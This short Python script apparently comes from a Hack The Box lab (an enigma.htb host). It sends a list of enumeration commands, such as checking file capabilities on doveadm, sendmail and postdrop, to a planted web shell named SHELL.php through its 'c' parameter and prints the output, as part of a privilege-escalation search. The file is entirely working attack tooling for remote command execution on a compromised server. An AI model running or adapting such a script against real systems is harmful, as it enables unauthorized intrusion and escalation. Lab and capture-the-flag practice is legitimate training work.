import urllib.request, urllib.parse

cmds = [
    "which doveadm 2>&1",
    "ls -la /usr/bin/doveadm 2>&1",
    "ls -la /usr/sbin/doveadm 2>&1",
    "doveadm help 2>&1 | head -30",
    # Check Dovecot deliver binary
    "ls -la /usr/lib/dovecot/ 2>&1 | head -20",
    # Check capabilities
    "getcap /usr/bin/doveadm 2>&1",
    "getcap /usr/sbin/doveadm 2>&1",
    "getcap /usr/sbin/sendmail 2>&1",
    "getcap /usr/sbin/postdrop 2>&1",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
